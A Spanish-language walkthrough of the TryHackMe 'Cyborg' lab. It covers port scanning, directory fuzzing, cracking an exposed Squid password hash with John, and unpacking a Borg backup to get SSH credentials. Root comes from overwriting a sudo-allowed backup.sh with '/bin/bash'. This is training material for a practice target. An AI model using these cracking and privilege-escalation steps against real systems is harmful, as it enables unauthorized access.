---
layout: post
author: Isui
title: Cyborg TryHackMe Spanish Walkthrough
---

![](/images/cyborg/banners_ctf.png "banner Cyborg")

Wh4t's?:
Un cuadro que incluye archivos cifrados, análisis de código fuente y más.
# Reconocimiento

Comencé enviando una trama ICMP al target `10.10.68.239`:

```sh
┌──(isui㉿kali)-[~/TryHackMe/cyborg]
└─$ ping -c 1 10.10.68.239
PING 10.10.68.239 (10.10.68.239) 56(84) bytes of data.
64 bytes from 10.10.68.239: icmp_seq=1 ttl=63 time=146 ms

--- 10.10.68.239 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 146.408/146.408/146.408/0.000 ms
```

en base al resultado anterior pude inferir que se trata de un sistema basado en Kernel Linux/Unix.

### Escaneo de puerto

Continue realizando un escaneo de puertos general

```sh
┌──(isui㉿kali)-[~/TryHackMe/cyborg]
└─$ sudo nmap -p- --open -sS --min-rate 1000 -vv -n -Pn 10.10.68.239 -oG portsGeneral
[sudo] password for isui: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-15 03:47 CST
Initiating SYN Stealth Scan at 03:47
Scanning 10.10.68.239 [65535 ports]
Discovered open port 22/tcp on 10.10.68.239
Discovered open port 80/tcp on 10.10.68.239
Completed SYN Stealth Scan at 03:48, 46.29s elapsed (65535 total ports)
Nmap scan report for 10.10.68.239
Host is up, received user-set (0.15s latency).
Scanned at 2024-07-15 03:47:21 CST for 47s
Not shown: 65486 closed tcp ports (reset), 47 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 46.40 seconds
           Raw packets sent: 70511 (3.102MB) | Rcvd: 70053 (2.802MB)
```

El resultado del escaneo, expuso los puertos `22 & 80` abiertos ejecutando el servicio SSH y HTTP, por lo consiguiente, procedí, a realizar un escaneo de puertos más exahustivo:

```sh
┌──(isui㉿kali)-[~/TryHackMe/cyborg]
└─$ sudo nmap -p22,80 -sC -sV 10.10.68.239 -A -oN target                        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-15 03:50 CST
Nmap scan report for 10.10.68.239
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.2 - 4.9 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   145.75 ms 10.21.0.1
2   145.91 ms 10.10.68.239

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.25 seconds
```

Este escaneo expuso las versiones de los servicios. Como parte del reconocimiento del target, busque en Google con ayuda de Launchpad, las posibles versiones del codename del SO:

![](/images/cyborg/Pasted image 20240715035327.png)

El servicio SSH revelo que posiblemente me enfrento a un SO Ubuntu Xenial.

![](/images/cyborg/Pasted image 20240715035458.png)

Mientras que el servicio Apache, revelo la misma información, por ahora puedo descartar un posible Port Forwarding o Virtual Hosting.

# Enumeración

Ahora desde el navegador, visualice el servicio HTTP, y pude notar que se encontraba la página por defecto del servicio Apache.

![](/images/cyborg/Pasted image 20240715041735.png)

En base a mi experiencia commence a realizar un ataque de Fuzzing:

```ruby
┌──(isui㉿kali)-[~/TryHackMe/cyborg]
└─$ gobuster dir -u http://10.10.68.239 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.68.239
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://10.10.68.239/admin/]
/etc                  (Status: 301) [Size: 310] [--> http://10.10.68.239/etc/]
/server-status        (Status: 403) [Size: 277]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

En un principio el ataque de Fuzzing, expuso dos directorios que no son tan comunes, `etc & admin`. Primero reviser el directorio Admin, que que el que más interesante puede ser:

![](/images/cyborg/Pasted image 20240715045649.png)

Intentando enumerar las distintas páginas que muestra el Sitio, puede notar que no tenían una funcionalidad, y solo eran estáticas:

![](/images/cyborg/Pasted image 20240715045849.png)

Pero una de estás páginas, si contaba con una apartado parecido a un chat que muestra una interesante conversación así como nombres de usuarios:

![](/images/cyborg/Pasted image 20240715050214.png)

La traducción del chat sería:

```
############################################
 ############################################
 [Ayer a las 16.32 de Josh]
 ¿¿Vamos todos a ver el partido de fútbol el fin de semana??
 ############################################
 ############################################
 [Ayer a las 16.33 de Adam]
 Sí, sí, amigo, ¡espero que ganen!
 ############################################
 ############################################
 [Ayer a las 16.35 de Josh]
 ¡Nos vemos allí entonces amigo!
 ############################################
 ############################################
 [Hoy a las 5.45 de Alex]
 Ok, lo siento chicos, creo que arruiné algo, uhh, estaba jugando con el proxy de calamar que mencioné antes.
 Decidí rendirme como siempre lo hago jajajaja lo siento.
 Escuché que se supone que estos proxy hacen que tu sitio web sea seguro, pero apenas sé cómo usarlos, así que probablemente lo esté haciendo más inseguro en el proceso.
 Podría pasárselo a los chicos de TI, pero mientras tanto todos los archivos de configuración están por ahí.
 Y como no sé cómo funciona, no estoy seguro de cómo eliminarlos, espero que no contengan información confidencial jajaja.
 Aparte de eso, estoy bastante seguro de que mi copia de seguridad "music_archive" está segura solo para confirmar.
 ############################################
 ############################################
```

En la conversación se muestra como el usuario `Alex` menciona que se encuentra configurando algún servicio, pero considera que no lo ha configurado lo suficiente, y de hecho cree que ahora se encuentra más inseguro. Es decir, seguramente, solo esta instalando o configurando por defecto. Y que realizo una copia de seguridad.

Con esta información continue enumerando, pero guarde los nombres de usuario en mi directorio de trabajo:

![](/images/cyborg/Pasted image 20240715050804.png)

Continuando con la enumeración vi que había un apartado en donde podia descargar un archivo comprimido:

![](/images/cyborg/Pasted image 20240715050949.png)

Por lo que lo descargue en mi equipo y lleve a mi directorio de trabajo:

![](/images/cyborg/Pasted image 20240715051055.png)

Con el comando:

```sh
mv /home/isui/Downloads/archive.tar . 
```

Antes de revisar el contenido de la carperta, revise el código fuente de las páginas, para intentar no dejar nada de la enumeración:

![](/images/cyborg/Pasted image 20240715051308.png)

Pero no encontré nada. Luego de ello, revise en el otro directorio, expuesto en `etc`:

![](/images/cyborg/Pasted image 20240715051439.png)

Y descubri que el directorio, era vulnerable a Directory Listening, lo que hace, es exponer información a un actor no autorizado. Dentro de está página, existe otro directorio al menos a simple vista: `squid`:

![](/images/cyborg/Pasted image 20240715051618.png)

Dentro del directorio `squid`, de muestran dos posible archivos criticos.

El primer archivo `passwd` parece ser una contraseña, seguramente cifrada:

![](/images/cyborg/Pasted image 20240715052240.png)

Para guardar esta información en mi directorio de trabajo, utilice la herramienta `curl`:

![](/images/cyborg/Pasted image 20240715052330.png)

El siguiente archivo, parece ser que es más bien una configuración de un servicio de Proxy, del cual no conozco:

![](/images/cyborg/Pasted image 20240715052642.png)

Por lo que decidí realizar una investigación de que se trataba y sí, esto es una configuración de autenticación básica para el servidor proxy Squid. Squid es un servidor proxy que ofrece caché y control de acceso para mejorar la eficiencia de las redes y proporcionar seguridad. La configuración es para configurar la autenticación básica usando NCSA (National Center for Supercomputing Applications) y definir cómo se manejarán las solicitudes autenticadas.

1. **auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd**
   - Esta línea especifica el programa que Squid utilizará para autenticar a los usuarios.
   - `basic_ncsa_auth` es el programa que verifica las credenciales de los usuarios contra un archivo de contraseñas en formato NCSA.
   - `/etc/squid/passwd` es el archivo que contiene las contraseñas y los nombres de usuario.

2. **auth_param basic children 5**
   - Especifica el número de procesos hijos que se crearán para manejar la autenticación.
   - Tener múltiples procesos hijos permite manejar varias solicitudes de autenticación simultáneamente.

3. **auth_param basic realm Squid Basic Authentication**
   - Define el realm de autenticación que será mostrado a los usuarios cuando se les solicite ingresar sus credenciales.
   - El realm es una cadena de texto que se presenta a los usuarios para indicarles a qué están accediendo.

4. **auth_param basic credentialsttl 2 hours**
   - Define el tiempo de vida de las credenciales en la caché.
   - En este caso, las credenciales serán consideradas válidas durante 2 horas antes de que el usuario deba autenticarse nuevamente.

5. **acl auth_users proxy_auth REQUIRED**
   - Define una lista de control de acceso (ACL) llamada `auth_users`.
   - Esta ACL utiliza `proxy_auth REQUIRED` para indicar que se requiere autenticación básica para que se permita el acceso.

6. **http_access allow auth_users**
   - Permite el acceso HTTP a los usuarios que coinciden con la ACL `auth_users`, es decir, aquellos que se han autenticado correctamente.

##### Ejemplo Completo:
```plaintext
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

##### Creación del Archivo de Contraseñas
Para crear y gestionar el archivo de contraseñas (`/etc/squid/passwd`), puedes usar la herramienta `htpasswd` que forma parte del paquete `apache2-utils` en muchas distribuciones de Linux. Aquí tienes un ejemplo de cómo crear este archivo y añadir un usuario:

```bash
sudo htpasswd -c /etc/squid/passwd usuario1
```

Esto te pedirá que ingreses una contraseña para `usuario1` y creará el archivo con ese usuario. Para añadir más usuarios:

```bash
sudo htpasswd /etc/squid/passwd usuario2
```

Quizá este archivo de configuración, por ahora no sea útil, pero lo guarde para cuando obtenga acceso al target:

![](/images/cyborg/Pasted image 20240715053540.png)

Ahora que ya tenia dicha información, con la herramienta John, intente descifrar la contraseña que había obtenido anteriormente:

```sh
john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt
```

![](/images/cyborg/Pasted image 20240715055057.png)

Ya teniendo una credencial, posiblemente valida, continue, revisando el contenido de la carpeta comprimida que había descargado anteriormente:

```ruby
┌──(isui㉿kali)-[~/TryHackMe/cyborg]
└─$ mkdir -p archive                     

┌──(isui㉿kali)-[~/TryHackMe/cyborg]
└─$ tar -xvf archive.tar -C archive 
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1

┌──(isui㉿kali)-[~/TryHackMe/cyborg]
└─$ cd archive 

┌──(isui㉿kali)-[~/TryHackMe/cyborg/archive]
└─$ 

```

Revisando los archivos, pude notar que la gran mayoría no era legibles, por lo que busque en internet en base a la información extraída de algunos de los archivos como por ejemplo que se trata de un Backup de Borg.

![](/images/cyborg/Pasted image 20240715061442.png)

Y pues descubrí que se trata de un servicio para realizar copias de seguridad:

![](/images/cyborg/Pasted image 20240715061642.png)

Buscando en internet encontré lo siguiente:

![](/images/cyborg/Pasted image 20240715144919.png)

Buscando información me di cuenta que se puede restaurar una copia de seguridad, y seguramente debe ser el caso al que me enfrento, dado que intentando visualizar los archivos parecen estar cifrados:

![](/images/cyborg/Pasted image 20240715145211.png)

![](/images/cyborg/Pasted image 20240715145252.png)

Por lo que instalé Borg en mi equipo, para comprobar si es posible visualizar la copia de seguridad.

![](/images/cyborg/Pasted image 20240715145350.png)

Pude notar que es una herramienta actualizada, apenas a fecha Julio de 2024, tiene dos semanas de haber sido actualizada.

![](/images/cyborg/Pasted image 20240715145459.png)

Revisando la documentación para instalar la herramienta, me di cuenta que existía una versión para instalar mediante APT:

```ruby
┌──(isui㉿kali)-[~/TryHackMe/cyborg]
└─$ sudo apt install borgbackup
[sudo] password for isui: 
The following packages were automatically installed and are no longer required:
  libdaxctl1       libndctl6  libre2-10   node-cjs-module-lexer nodejs         openjdk-21-jre-headless samba-dsdb-modules
  libgeos3.12.1t64 libnode109 libx265-199 node-undici           nodejs-doc     python3-mistune0
  libjxl0.7        libpmem1   node-acorn  node-xtend            openjdk-21-jre samba-ad-provision
Use 'sudo apt autoremove' to remove them.

Installing:
  borgbackup

Suggested packages:
  python3-pyfuse3 borgbackup-doc

Summary:
  Upgrading: 0, Installing: 1, Removing: 0, Not Upgrading: 0
  Download size: 874 kB
  Space needed: 3387 kB / 17.2 GB available

Get:1 http://kali.download/kali kali-rolling/main amd64 borgbackup amd64 1.2.8-1 [874 kB]
Fetched 874 kB in 0s (1851 kB/s)  
Selecting previously unselected package borgbackup.
(Reading database ... 404516 files and directories currently installed.)
Preparing to unpack .../borgbackup_1.2.8-1_amd64.deb ...
Unpacking borgbackup (1.2.8-1) ...
Setting up borgbackup (1.2.8-1) ...
Processing triggers for man-db (2.12.1-2) ...
Processing triggers for kali-menu (2023.4.7) ...
```

Intentare realizar la restauración con está versión que se ve más desactualiza, de lo contrario utilizaré la versión más actual.

# Explotación

Para intentar extraer la información busque en la documentación un apartado que indicara dicho caso, o algo similar, y si lo encontré:

![](/images/cyborg/Pasted image 20240715150649.png)

Por lo que mediante el siguiente comando intente listar la información del backup:

```ruby
borg list archive/home/field/dev/final_archive/
```

Al intentar ejecutar dicho comando, me solicito una contraseña, por lo que probe con la contraseña que había descifrado anteriormente:

![](/images/cyborg/Pasted image 20240715151004.png)

El resultado, arrojo lo que parece ser un directorio, con el nombre: `music_archive`

Siguiendo la documentación lo que tocaba, ahora es extraer dicho directorio, esto lo logre siguiendo la documentación:

![](/images/cyborg/Pasted image 20240715151228.png)

Mediante el comando:

```ruby
borg extract archive/home/field/dev/final_archive/::music_archive
```

Nuevamente este comando utilizo la contraseña que se había descubierto anteriormente.

![](/images/cyborg/Pasted image 20240715151554.png)

Finalmente puede ver en mi directorio de trabajo, un directorio llamado `home` que revise:} con el comando:

```sh
ls -la * home/alex/
```

![](/images/cyborg/Pasted image 20240715151701.png)

Durante la búsqueda de este directorio, de lo que parece ser el backup de un perfil completo, se puede observar un documento `.txt` que llama la atención, pero que finalmente no tiene información crítica:

![](/images/cyborg/Pasted image 20240715151916.png)

Realizando una búsqueda más general, pude notar que el directorio `Documents` contiene otro archivo, ya que todos los demás se encuentran vacíos.

![](/images/cyborg/Pasted image 20240715152115.png)

Revisando este documento, se muestran en texto claro, un usuario y contraseña en texto claro. Puedo dar por echo que se trata del mismo usuario que realizo la copia de seguridad.

![](/images/cyborg/Pasted image 20240715152342.png)

Antes siquiera de lograr este hallazgo, me había planteado la idea de mediante la herramienta Hydra, realizar un ataque de fuerza bruta, mediante  los usuarios enumerados, y la contraseña descifrada.

Guarde las nuevas credenciales en un archivo, e intente conectarme mediante el servicio SSH:

> Nota: Había reiniciado la box de TryHackMe. Por eso cambio la IP, pero la metodología es la misma.

![](/images/cyborg/Pasted image 20240715152740.png)

Se logró tener éxito con la conexión mediante el servicio SSH, por lo que realice un reset de la STTY para poder trabajar más comodo:

Lo primero que hice, fue realizar un reconocimiento del directorio del usuario Alex:

![](/images/cyborg/Pasted image 20240715153039.png)

Esto revelo, lo que podría ser información crítica. Lo primero que hice fue revisar el archivo `user.txt`, que seguramente sería la primer bandera del CTF:

![](/images/cyborg/Pasted image 20240715153209.png)

Lo que fue cierto.

# Escalada de privilegios

Antes de realizar la búsqueda en todo el sistema, que para intentar hallar binarios o ejecutables, o cualquier indicio de SIUD, primero revise el historial de comandos:

![](/images/cyborg/Pasted image 20240715153750.png)


Pude notar algunas irregularidades, que no entendí del todo, pero pude ver que el archivo `./backup.sh` es ejecutado como administrado, por lo que me da a entender que es el usuario Alex quien lo ejecuta, y por lo tanto o conoce la contraseña, para SUDO o tiene privilegios para el archivo.

Siguiendo está lógica, realice el comando:

```ruby
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
alex@ubuntu:~$ 
```

Y como había deducido, el archivo `backup.sh` contaba con privilegios asignados, y se trata de un archivo en Bash. Por lo que la lógica indica que si cambio o agrego la configuración y ejecución de dicho archivo, podré seguramente escalar privilegios.

```ruby
nano /etc/mp3backups/backup.sh
```

![](/images/cyborg/Pasted image 20240715155128.png)

Si bien, lo primero que se me ocurrió, fue crear una línea más de código, que me diera una terminal, pero recordé algunos casos, en donde el archivo es propiedad del usuario, así que los intente:

![](/images/cyborg/Pasted image 20240715155654.png)

#### La explicación de los comandos a continuación:

**Comando 1: Cambiar permisos de un archivo**

```bash
chmod 777 /etc/mp3backups/backup.sh
```
- **chmod**: Comando para cambiar los permisos de un archivo o directorio.
- **777**: Permisos otorgados:
  - **7 (rwx)**: Permiso de lectura (read), escritura (write) y ejecución (execute) para el propietario del archivo.
  - **7 (rwx)**: Permiso de lectura, escritura y ejecución para el grupo del archivo.
  - **7 (rwx)**: Permiso de lectura, escritura y ejecución para otros usuarios.

En resumen, `chmod 777` otorga permisos de lectura, escritura y ejecución a todos los usuarios para el archivo `/etc/mp3backups/backup.sh`.

**Comando 2: Sobrescribir el contenido de un archivo**

```bash
echo "bin/bash" > /etc/mp3backups/backup.sh
```

- **echo "bin/bash"**: Imprime la cadena `"bin/bash"`.
- **>**: Redirecciona la salida del comando anterior (echo) al archivo especificado, sobrescribiendo su contenido.
- **/etc/mp3backups/backup.sh**: Archivo donde se escribirá la cadena.

El comando sobrescribe el contenido del archivo `backup.sh` con la cadena `"bin/bash"`.

**Comando 3: Ejecutar el archivo como superusuario**

```bash
sudo /etc/mp3backups/backup.sh
```

- **sudo**: Ejecuta un comando con privilegios de superusuario.
- **/etc/mp3backups/backup.sh**: Archivo que se ejecuta.

### Salida del Comando

```plaintext
/etc/mp3backups/backup.sh: 1: /etc/mp3backups/backup.sh: bin/bash: not found
```

El archivo intenta ejecutar `bin/bash`, pero falla porque la ruta `bin/bash` no existe. El intérprete de comandos no encuentra el ejecutable especificado.

**Comando 4: Sobrescribir el contenido del archivo con la ruta correcta**

```bash
echo "/bin/bash" > /etc/mp3backups/backup.sh
```

- **echo "/bin/bash"**: Imprime la cadena `"/bin/bash"`.
- **>**: Redirecciona la salida del comando anterior al archivo especificado, sobrescribiendo su contenido.
- **/etc/mp3backups/backup.sh**: Archivo donde se escribirá la cadena.

El comando sobrescribe el contenido del archivo `backup.sh` con la cadena `"/bin/bash"`.

**Comando 5: Ejecutar el archivo como superusuario nuevamente**

```bash
sudo /etc/mp3backups/backup.sh
```

- **sudo**: Ejecuta un comando con privilegios de superusuario.
- **/etc/mp3backups/backup.sh**: Archivo que se ejecuta.

**Resultado del Comando**

Esta vez, el archivo `backup.sh` contiene la línea `"/bin/bash"`, que es una ruta válida al ejecutable de Bash. Ejecutar el script con `sudo` abrirá un intérprete de Bash con privilegios de super usuario `root`.

Una vez con permiso de `root`, ingrese al directorio Root, y pude ver la flag final:

![](/images/cyborg/Pasted image 20240715160255.png)

tHanks f0r read1ng w1th L0v3 Isu <3

And H4ppy H4cking!